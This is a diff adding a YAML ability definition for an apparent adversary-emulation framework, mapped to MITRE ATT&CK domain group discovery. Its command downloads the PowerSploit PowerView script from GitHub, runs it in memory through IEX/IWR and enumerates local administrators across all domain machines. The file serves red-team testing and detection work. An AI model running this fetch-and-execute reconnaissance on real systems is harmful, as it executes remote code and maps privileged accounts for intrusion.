@@ -1,0 +1,17 @@
+- description: 'Enumerates members of the local Administrators groups across all machines
+    in the domain. Upon execution, information about each machine will be displayed.
+
+    '
+  id: e0ece8dadb32583978706956f530bae3
+  name: Find local admins on all machines in domain (PowerView)
+  platforms:
+    windows:
+      psh:
+        cleanup: ''
+        command: IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1');
+          Invoke-EnumerateLocalAdmin  -Verbose
+        payloads: []
+  tactic: discovery
+  technique:
+    attack_id: T1069.002
+    name: 'Permission Groups Discovery: Domain Groups'
